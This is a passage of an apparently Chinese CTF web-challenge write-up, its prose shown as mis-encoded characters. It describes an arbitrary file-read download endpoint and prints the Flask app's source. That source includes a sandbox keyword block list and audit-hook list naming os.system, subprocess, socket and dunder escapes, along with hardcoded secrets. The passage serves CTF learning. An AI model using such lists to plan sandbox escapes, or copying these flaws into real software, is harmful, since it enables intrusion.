alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¾€ä¸‹é¢ç¿»å‘ç°äº†è¿™é‡Œæœ‰ä¸ªè¶…é“¾æ¥ï¼Œä¼¼ä¹å¯ä»¥ç‚¹ï¼Œç‚¹å‡»ä¹‹åå‘ç°æ˜¯ä¸‹è½½åšå®¢çš„åœ°æ–¹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/6751e2c1503f470697ba7fbe83c7d605.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æŠ“åŒ…ä¹‹åå‘ç°äº†æ–‡ä»¶ä¸‹è½½æ¥å£ï¼Œä¼¼ä¹å¯ä»¥ä»»æ„æ–‡ä»¶è¯»ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/e5a07ef7ba6546d29923caaef1d693fa.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¯•ç€è¯»å–æ ¹ç›®å½•ä¸‹çš„ flag æ–‡ä»¶å¤±è´¥äº†ï¼Œè¢« forbidden äº†ï¼Œä¸è¿‡å¯ä»¥è¯»å–æºç ï¼Œç›´æ¥ä¸‹è½½ app.py å¾—åˆ°æºç ï¼Œæºç é‡Œæœ‰ç”¨çš„åœ°æ–¹åœ¨è¿™å„¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template, session, redirect, url_for, flash,send_file, abort</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;super_secret_key_for_session_2025&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;password_md5&#x27;</span>: hashlib.md5(<span class="string">&#x27;KAlsidhKUHLKjhdskfhkajHSKDJH&#x27;</span>.encode()).hexdigest(),</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;admin@example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;id_card&#x27;</span>: <span class="string">&#x27;110101199003072316&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phone&#x27;</span>: <span class="string">&#x27;13800138000&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SandboxSecurityException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Non-ASCII characters are not allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line">    dangerous_keywords = [  <span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;hasattr&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;quit&quot;</span>, <span class="string">&quot;vars&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;locals&quot;</span>, <span class="string">&quot;delattr&quot;</span>, <span class="string">&quot;help&quot;</span>, <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;requests&quot;</span>, <span class="string">&quot;socket&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;urllib&quot;</span>, <span class="string">&quot;ctypes&quot;</span>, <span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;pickle&quot;</span>, <span class="string">&quot;input&quot;</span>, <span class="string">&quot;codecs&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__getattribute__&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__bases__&quot;</span>, <span class="string">&quot;__mro__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__init__&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;__name__&quot;</span>, <span class="string">&quot;__dict__&quot;</span>, <span class="string">&quot;__code__&quot;</span>, <span class="string">&quot;__closure__&quot;</span>, <span class="string">&quot;__defaults__&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;subclasses&quot;</span>, <span class="string">&quot;importlib&quot;</span>, <span class="string">&quot;load&quot;</span>, <span class="string">&quot;loads&quot;</span>, <span class="string">&quot;dump&quot;</span>, <span class="string">&quot;dumps&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;spawn&quot;</span>, <span class="string">&quot;fork&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;chdir&quot;</span>, <span class="string">&quot;remove&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;rmdir&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;listdir&quot;</span>, <span class="string">&quot;environ&quot;</span>, <span class="string">&quot;getenv&quot;</span>, <span class="string">&quot;putenv&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;read&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;flush&quot;</span>, <span class="string">&quot;seek&quot;</span>, <span class="string">&quot;tell&quot;</span>, <span class="string">&quot;truncate&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;connect&quot;</span>, <span class="string">&quot;bind&quot;</span>, <span class="string">&quot;listen&quot;</span>, <span class="string">&quot;accept&quot;</span>, <span class="string">&quot;send&quot;</span>, <span class="string">&quot;recv&quot;</span>, <span class="string">&quot;gethostname&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;gethostbyname&quot;</span>, <span class="string">&quot;getaddrinfo&quot;</span>, <span class="string">&quot;urlopen&quot;</span>, <span class="string">&quot;urlretrieve&quot;</span>, <span class="string">&quot;Request&quot;</span>,]</span><br><span class="line">    <span class="keyword">for</span> kw <span class="keyword">in</span> dangerous_keywords:</span><br><span class="line">        <span class="keyword">if</span> kw <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Disallowed keyword: <span class="subst">&#123;kw&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code_obj</span>):</span><br><span class="line">    opcode_io = StringIO()</span><br><span class="line">    dis(code_obj, file=opcode_io)</span><br><span class="line">    opcodes = opcode_io.getvalue().splitlines()</span><br><span class="line">    opcode_io.close()</span><br><span class="line"></span><br><span class="line">    allowed_globals = &#123;<span class="string">&quot;print&quot;</span>, <span class="string">&quot;len&quot;</span>, <span class="string">&quot;str&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;float&quot;</span>, <span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;seed&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;LOAD_GLOBAL&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">4</span> <span class="keyword">and</span> parts[<span class="number">3</span>].startswith(<span class="string">&#x27;(&#x27;</span>) <span class="keyword">and</span> parts[<span class="number">3</span>].endswith(<span class="string">&#x27;)&#x27;</span>):</span><br><span class="line">                name = parts[<span class="number">3</span>][<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> allowed_globals:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Disallowed global access: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;IMPORT_NAME&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Import statements are not allowed&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;LOAD_METHOD&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    dangerous_events = &#123;</span><br><span class="line">        <span class="string">&quot;os.system&quot;</span>, <span class="string">&quot;os.popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.call&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.check_output&quot;</span>, <span class="string">&quot;subprocess.run&quot;</span>, <span class="string">&quot;subprocess.getoutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;builtins.eval&quot;</span>, <span class="string">&quot;builtins.compile&quot;</span>, <span class="string">&quot;builtins.__import__&quot;</span>, <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">        <span class="string">&quot;import&quot;</span>, <span class="string">&quot;importlib&quot;</span>, <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;importlib.import_module&quot;</span>,</span><br><span class="line">        <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;os.open&quot;</span>, <span class="string">&quot;os.read&quot;</span>, <span class="string">&quot;os.write&quot;</span>,</span><br><span class="line">        <span class="string">&quot;urllib.request.urlopen&quot;</span>, <span class="string">&quot;urllib.request.Request&quot;</span>, <span class="string">&quot;requests.&quot;</span>, <span class="string">&quot;socket.socket&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http.client.HTTPConnection&quot;</span>, <span class="string">&quot;http.client.HTTPSConnection&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ctypes.&quot;</span>, <span class="string">&quot;marshal.loads&quot;</span>, <span class="string">&quot;os.execv&quot;</span>, <span class="string">&quot;os.execve&quot;</span>, <span class="string">&quot;os.execvp&quot;</span>, <span class="string">&quot;os.execvpe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.environ&quot;</span>, <span class="string">&quot;os.getenv&quot;</span>, <span class="string">&quot;os.getpid&quot;</span>, <span class="string">&quot;os.getuid&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;os.system&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.remove&quot;</span>, <span class="string">&quot;os.unlink&quot;</span>, <span class="string">&quot;os.chmod&quot;</span>, <span class="string">&quot;os.chown&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> dangerous_event <span class="keyword">in</span> dangerous_events:</span><br><span class="line">        <span class="keyword">if</span> event == dangerous_event <span class="keyword">or</span> event.startswith(dangerous_event + <span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_id_card</span>(<span class="params">id_card</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d&#123;17&#125;[\dXx]$&#x27;</span>, id_card))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;^1[3-9]\d&#123;9&#125;$&#x27;</span>, phone))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLOG_DIR = <span class="string">&#x27;blog&#x27;</span></span><br><span class="line">os.makedirs(BLOG_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_blog_posts</span>():</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(BLOG_DIR):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.html&#x27;</span>):</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+)ã€(.+)\.html$&#x27;</span>, filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                num = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                title = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">                posts.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;num&#x27;</span>: num,</span><br><span class="line">                    <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">                    <span class="string">&#x27;filename&#x27;</span>: filename</span><br><span class="line">                &#125;)</span><br><span class="line">    posts.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;num&#x27;</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> posts</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_next_post_number</span>():</span><br><span class="line">    max_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(BLOG_DIR):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.html&#x27;</span>):</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+)ã€&#x27;</span>, filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                num = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">if</span> num &gt; max_num:</span><br><span class="line">                    max_num = num</span><br><span class="line">    <span class="keyword">return</span> max_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    logged_in = <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session</span><br><span class="line">    posts = get_blog_posts()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, logged_in=logged_in, posts=posts)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            flash(<span class="string">&#x27;è¯·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç &#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pwd_md5 = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line">        user = users.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user[<span class="string">&#x27;password_md5&#x27;</span>] == pwd_md5:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/admin&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blog/&lt;filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_blog</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&#x27;.html&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ— æ•ˆæ–‡ä»¶&quot;</span>, <span class="number">400</span></span><br><span class="line">    filepath = os.path.join(BLOG_DIR, filename)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ç« ä¸å­˜åœ¨&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    next_num = get_next_post_number()</span><br><span class="line">    posts = get_blog_posts()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], next_num=next_num, posts=posts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/publish&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">publish_blog</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;æœªç™»å½•&#x27;</span>&#125;), <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> title <span class="keyword">or</span> <span class="keyword">not</span> content:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;æ ‡é¢˜å’Œå†…å®¹ä¸èƒ½ä¸ºç©º&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    next_num = get_next_post_number()</span><br><span class="line">    safe_title = <span class="string">&quot;&quot;</span>.join(c <span class="keyword">if</span> c.isalnum() <span class="keyword">or</span> c <span class="keyword">in</span> (<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> title)</span><br><span class="line">    filename = <span class="string">f&quot;<span class="subst">&#123;next_num&#125;</span>ã€<span class="subst">&#123;safe_title&#125;</span>.html&quot;</span></span><br><span class="line">    filepath = os.path.join(BLOG_DIR, filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">f&#x27;åšå®¢ã€Š<span class="subst">&#123;title&#125;</span>ã€‹å‘å¸ƒæˆåŠŸï¼&#x27;</span>&#125;)</span><br><span 